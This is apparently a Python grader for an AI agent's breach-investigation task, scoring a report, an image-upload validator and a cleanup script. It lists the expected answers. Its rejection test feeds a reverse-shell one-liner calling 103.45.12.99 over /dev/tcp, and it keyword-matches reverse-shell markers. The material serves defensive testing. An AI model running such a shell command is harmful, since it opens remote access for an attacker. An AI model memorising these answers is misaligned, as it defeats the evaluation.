"""
Incident Response: Proprietary App Breach Investigation — Scoring Script
=========================================================================

Total score: 100

Scoring dimensions:
I. File Delivery Completeness (10 pts)
  - Incident_Report.md exists with substantive content (3 pts)
  - secure_upload.py exists with substantive content (4 pts)
  - cleanup.sh exists with substantive content (3 pts)

II. Incident Response Report Quality (30 pts)
  2.1 Attacker attribution (5 pts): Correctly identify IP 103.45.12.99
  2.2 XOR payload decryption (10 pts): Decrypt to "cat /etc/passwd"
  2.3 Decryption method description (5 pts): Describe XOR + SECRET_KEY method
  2.4 Malicious file identification (5 pts): Identify avatar_update.jpg as malicious
  2.5 Malicious file technical analysis (5 pts): Explain reverse shell + image spoofing

III. secure_upload.py Dynamic Testing (35 pts)
  3.1 Function definition exists (5 pts): validate_image_header function is callable
  3.2 Accept legitimate JPEG (10 pts): Return truthy for JPEG magic bytes file
  3.3 Reject malicious script (10 pts): Return falsy for text content
  3.4 File pointer reset (5 pts): stream.tell() == 0 after call
  3.5 Accept legitimate PNG (5 pts): Return truthy for PNG magic bytes file

IV. cleanup.sh Script Quality (25 pts)
  4.1 Remove malicious file (10 pts): Contains rm + avatar_update.jpg
  4.2 Block attacker IP (10 pts): Contains 103.45.12.99 + iptables/ufw
  4.3 Script conventions (5 pts): shebang / comments / output / error handling
"""

import os
import io
import sys
from typing import Tuple, Dict, Any
from unittest.mock import MagicMock


# ---------------------------------------------------------------------------
# Utility functions
# ---------------------------------------------------------------------------

def _safe_read(path: str) -> str:
    """Safely read a text file; return empty string on failure."""
    if not os.path.isfile(path):
        return ""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            return fh.read()
    except Exception:
        return ""


# ===========================================================================
# I. File Delivery Completeness (10 pts)
# ===========================================================================

def _score_file_delivery(answer_dir: str) -> Tuple[int, dict]:
    score = 0
    details: Dict[str, str] = {}

    deliverables = [
        ("Incident_Report.md", 3),
        ("secure_upload.py", 4),
        ("cleanup.sh", 3),
    ]

    for name, pts in deliverables:
        fp = os.path.join(answer_dir, name)
        if os.path.isfile(fp):
            size = os.path.getsize(fp)
            if size > 20:
                score += pts
                details[name] = f"{pts}/{pts} — present ({size} bytes)"
            else:
                half = max(1, pts // 2)
                score += half
                details[name] = f"{half}/{pts} — file exists but content too small ({size} bytes)"
        else:
            details[name] = f"0/{pts} — not found"

    return score, details


# ===========================================================================
# II. Incident Response Report Quality (30 pts)
# ===========================================================================

def _score_incident_report(answer_dir: str) -> Tuple[int, dict]:
    score = 0
    details: Dict[str, str] = {}

    text = _safe_read(os.path.join(answer_dir, "Incident_Report.md"))
    if not text:
        return 0, {"report": "0/30 — file missing or empty"}

    text_lower = text.lower()

    # 2.1 Attacker IP attribution (5 pts)
    if "103.45.12.99" in text:
        score += 5
        details["2.1 Attacker IP"] = "5/5 — correctly identified 103.45.12.99"
    else:
        details["2.1 Attacker IP"] = "0/5 — not identified"

    # 2.2 XOR payload decryption (10 pts) — core test point
    #   Full decryption: "cat /etc/passwd"
    if "cat /etc/passwd" in text:
        score += 10
        details["2.2 Payload decryption"] = "10/10 — decrypted result 'cat /etc/passwd' correct"
    elif "cat" in text_lower and "/etc/passwd" in text:
        score += 7
        details["2.2 Payload decryption"] = "7/10 — contains cat and /etc/passwd but not as a complete phrase"
    elif "/etc/passwd" in text:
        score += 4
        details["2.2 Payload decryption"] = "4/10 — mentions /etc/passwd but decrypted command incomplete"
    else:
        details["2.2 Payload decryption"] = "0/10 — payload not decrypted"

    # 2.3 Decryption method description (5 pts)
    has_xor = "xor" in text_lower
    has_key = "sk_live_2024" in text or "secret_key" in text_lower
    if has_xor and has_key:
        score += 5
        details["2.3 Decryption method"] = "5/5 — correctly described XOR + SECRET_KEY"
    elif has_xor or has_key:
        score += 3
        details["2.3 Decryption method"] = "3/5 — partially described decryption method"
    else:
        details["2.3 Decryption method"] = "0/5 — decryption method not described"

    # 2.4 Malicious file identification (5 pts)
    if "avatar_update" in text_lower:
        score += 5
        details["2.4 Malicious file"] = "5/5 — identified avatar_update.jpg"
    else:
        details["2.4 Malicious file"] = "0/5 — malicious file not identified"

    # 2.5 Technical analysis (5 pts)
    reverse_kw = [
        "reverse shell", "反弹 shell", "反弹shell",
        "/dev/tcp", "os.system", "bash -i",
    ]
    spoofing_kw = [
        "magic byte", "魔术字", "magic number", "文件头",
        "extension", "扩展名", "伪装", "spoofed", "disguised",
    ]
    has_shell = any(kw in text_lower for kw in reverse_kw)
    has_spoof = any(kw in text_lower for kw in spoofing_kw)

    tech = 0
    if has_shell:
        tech += 3
    if has_spoof:
        tech += 2
    tech = min(tech, 5)
    score += tech

    if tech == 5:
        details["2.5 Technical analysis"] = "5/5 — complete analysis of reverse shell and file spoofing"
    elif tech > 0:
        details["2.5 Technical analysis"] = f"{tech}/5 — partial technical analysis"
    else:
        details["2.5 Technical analysis"] = "0/5 — technical analysis missing"

    return score, details


# ===========================================================================
# III. secure_upload.py Dynamic Testing (35 pts)
# ===========================================================================

def _score_code(answer_dir: str) -> Tuple[int, dict]:
    score = 0
    details: Dict[str, str] = {}

    src = _safe_read(os.path.join(answer_dir, "secure_upload.py"))
    if not src:
        return 0, {"code": "0/35 — secure_upload.py missing or empty"}

    # Execute in sandbox, mock flask/werkzeug to avoid import failures
    saved = {}
    mocks = ["flask", "werkzeug", "werkzeug.utils"]
    for m in mocks:
        saved[m] = sys.modules.get(m)
        sys.modules[m] = MagicMock()

    import unittest.mock as _um

    try:
        ns: dict = {}
        with _um.patch("os.makedirs"):
            exec(src, ns)
    except SyntaxError as exc:
        details["syntax"] = f"0/35 — syntax error: {exc}"
        return 0, details
    except Exception as exc:
        details["execution"] = f"0/35 — execution error: {exc}"
        return 0, details
    finally:
        for m in mocks:
            if saved[m] is None:
                sys.modules.pop(m, None)
            else:
                sys.modules[m] = saved[m]

    # 3.1 Function exists (5 pts)
    fn = ns.get("validate_image_header")
    if fn is None or not callable(fn):
        details["3.1 Function exists"] = "0/5 — validate_image_header not defined"
        return 0, details

    score += 5
    details["3.1 Function exists"] = "5/5 — validate_image_header is callable"

    # 3.2 Legitimate JPEG acceptance (10 pts)
    jpeg_magic = (
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00"
        b"\x00\x01\x00\x01\x00\x00"
    )
    buf_jpeg = io.BytesIO(jpeg_magic + b"\x00" * 120)
    try:
        res = fn(buf_jpeg)
        if res:
            score += 10
            details["3.2 JPEG accept"] = f"10/10 — returned {res!r}"
        else:
            details["3.2 JPEG accept"] = f"0/10 — incorrectly rejected (returned {res!r})"
    except Exception as exc:
        details["3.2 JPEG accept"] = f"0/10 — exception: {exc}"

    # 3.3 Malicious script rejection (10 pts)
    evil = b"import os; os.system('bash -i >& /dev/tcp/103.45.12.99/4444 0>&1')"
    buf_evil = io.BytesIO(evil)
    try:
        res = fn(buf_evil)
        if not res:
            score += 10
            details["3.3 Malicious reject"] = f"10/10 — correctly rejected (returned {res!r})"
        else:
            details["3.3 Malicious reject"] = f"0/10 — not blocked (returned {res!r})"
    except Exception as exc:
        details["3.3 Malicious reject"] = f"0/10 — exception: {exc}"

    # 3.4 File pointer reset (5 pts)
    buf_reset = io.BytesIO(jpeg_magic + b"\x00" * 120)
    try:
        fn(buf_reset)
        pos = buf_reset.tell()
        if pos == 0:
            score += 5
            details["3.4 Pointer reset"] = "5/5 — tell() == 0"
        else:
            details["3.4 Pointer reset"] = f"0/5 — tell() == {pos}"
    except Exception as exc:
        details["3.4 Pointer reset"] = f"0/5 — exception: {exc}"

    # 3.5 Legitimate PNG acceptance (5 pts)
    png_magic = (
        b"\x89PNG\r\n\x1a\n"           # 8-byte PNG signature
        b"\x00\x00\x00\rIHDR"          # IHDR chunk
        b"\x00\x00\x01\x00"            # width 256
        b"\x00\x00\x01\x00"            # height 256
        b"\x08\x02\x00\x00\x00"        # bit depth, color type, etc.
    )
    buf_png = io.BytesIO(png_magic + b"\x00" * 120)
    try:
        res = fn(buf_png)
        if res:
            score += 5
            details["3.5 PNG accept"] = f"5/5 — returned {res!r}"
        else:
            details["3.5 PNG accept"] = f"0/5 — incorrectly rejected (returned {res!r})"
    except Exception as exc:
        details["3.5 PNG accept"] = f"0/5 — exception: {exc}"

    return score, details


# ===========================================================================
# IV. cleanup.sh Script Quality (25 pts)
# ===========================================================================

def _score_cleanup(answer_dir: str) -> Tuple[int, dict]:
    score = 0
    details: Dict[str, str] = {}

    text = _safe_read(os.path.join(answer_dir, "cleanup.sh"))
    if not text:
        return 0, {"script": "0/25 — cleanup.sh missing or empty"}

    text_lower = text.lower()

    # 4.1 Remove malicious file (10 pts)
    has_rm = ("rm " in text or "rm\t" in text or "rm\n" in text)
    has_avatar = "avatar_update" in text
    if has_rm and has_avatar:
        score += 10
        details["4.1 Remove malicious file"] = "10/10 — contains rm + avatar_update"
    elif has_avatar:
        score += 5
        details["4.1 Remove malicious file"] = "5/10 — mentions file but missing rm"
    else:
        details["4.1 Remove malicious file"] = "0/10 — missing"

    # 4.2 Block IP (10 pts)
    has_ip = "103.45.12.99" in text
    has_fw = "iptables" in text_lower or "ufw" in text_lower
    if has_ip and has_fw:
        score += 10
        details["4.2 Block IP"] = "10/10 — blocks 103.45.12.99 via firewall"
    elif has_ip:
        score += 5
        details["4.2 Block IP"] = "5/10 — has IP but missing firewall command"
    elif has_fw:
        score += 3
        details["4.2 Block IP"] = "3/10 — has firewall command but incorrect IP"
    else:
        details["4.2 Block IP"] = "0/10 — missing"

    # 4.3 Script conventions (5 pts)
    pts = 0
    notes = []

    lines = text.strip().splitlines()
    if lines and lines[0].startswith("#!"):
        if "bash" in lines[0] or "sh" in lines[0]:
            pts += 2
            notes.append("shebang correct")
        else:
            pts += 1
            notes.append("shebang not bash/sh")
    else:
        notes.append("missing shebang")

    if text.count("#") >= 3:
        pts += 1
        notes.append("has comments")
    if "echo" in text_lower or "printf" in text_lower or "log" in text_lower:
        pts += 1
        notes.append("has output")
    if "set -e" in text or "|| true" in text or "2>/dev/null" in text:
        pts += 1
        notes.append("has error handling")

    pts = min(pts, 5)
    score += pts
    details["4.3 Script conventions"] = f"{pts}/5 — {'; '.join(notes)}"

    return score, details


# ===========================================================================
# Main entry
# ===========================================================================

def evaluate(answer_dir: str) -> Tuple[int, Dict[str, Any]]:
    """
    Evaluate the agent's output.

    Args:
        answer_dir: absolute path to the agent output directory

    Returns:
        (score, report)
        - score: integer from 0 to 100
        - report: dict containing detailed evaluation report
    """
    s1, d1 = _score_file_delivery(answer_dir)
    s2, d2 = _score_incident_report(answer_dir)
    s3, d3 = _score_code(answer_dir)
    s4, d4 = _score_cleanup(answer_dir)

    total = s1 + s2 + s3 + s4

    report: Dict[str, Any] = {
        "total_score": total,
        "section_scores": {
            "I. File delivery": f"{s1}/10",
            "II. Incident response report": f"{s2}/30",
            "III. Code dynamic testing": f"{s3}/35",
            "IV. Cleanup script": f"{s4}/25",
        },
        "details": {
            "I. File delivery (10 pts)": d1,
            "II. Incident response report (30 pts)": d2,
            "III. Code dynamic testing (35 pts)": d3,
            "IV. Cleanup script (25 pts)": d4,
        },
        "comment": "",
    }

    if total >= 90:
        report["comment"] = "Excellent! Forensic analysis accurate, code fix effective, cleanup script well-structured."
    elif total >= 70:
        report["comment"] = "Good. Incident response essentially complete, some dimensions could be improved."
    elif total >= 50:
        report["comment"] = "Passing. Core tasks partially completed, notable gaps remain."
    elif total >= 30:
        report["comment"] = "Partially complete. Key steps missing or incorrectly implemented."
    else:
        report["comment"] = "Failing. Task completion severely insufficient."

    return total, report


def print_report(score: int, report: Dict[str, Any]) -> None:
    """Print a formatted scoring report."""
    sep = "=" * 70
    thin = "─" * 50

    print(sep)
    print("Incident Response: Breach Investigation — Scoring Report")
    print(sep)
    print(f"\nTotal score: {score}/100")

    sec_scores = report.get("section_scores", {})
    if sec_scores:
        print("\nSection scores:")
        for k, v in sec_scores.items():
            print(f"  {k}: {v}")

    for section_name, section_data in report.get("details", {}).items():
        print(f"\n{thin}")
        print(f"[{section_name}]")
        print(thin)
        if isinstance(section_data, dict):
            for k, v in section_data.items():
                print(f"  {k}: {v}")
        else:
            print(f"  {section_data}")

    print(f"\n{sep}")
    print(f"Comment: {report.get('comment', '')}")
    print(sep)


if __name__ == "__main__":
    _dir = sys.argv[1] if len(sys.argv) > 1 else os.path.join(
        os.path.dirname(__file__), "..", "gpt-5", "attempt_1")
    if os.path.exists(_dir):
        print(f"Evaluating directory: {_dir}\n")
        _s, _r = evaluate(_dir)
        print_report(_s, _r)
    else:
        print(f"Directory not found: {_dir}")
    sys.exit(0)
